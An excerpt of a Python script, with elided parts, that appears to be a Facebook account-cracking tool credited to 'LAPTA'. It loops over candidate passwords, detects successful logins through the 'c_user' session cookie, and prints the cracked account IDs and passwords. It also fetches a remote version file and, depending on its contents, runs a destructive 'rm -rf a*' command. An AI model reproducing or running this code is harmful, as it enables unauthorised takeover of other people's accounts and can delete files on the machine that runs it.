...
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor     \033[0;91mLATPA
\033[0;92mFACEBOOK   \033[0;94mLAPTA
\033[0;94m────────────────────────────────────────────────────────
"""
loop = 0
oks = []
...
try:
    ...
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Kabirsingh11/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:
        pass
...
os.system('xdg-openhttps://www.facebook.com/LAPTA.HU.MAI ')
...
def random_number():
    user = []
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/LAPTA.HU.MAI ')
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[LAPTA-OK] ' + cid + ' | ' + ps + '\033[0;97m')
                ...
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[LAPTA-CP] ' + cid + ' | ' + ps + '\033[0;97m')
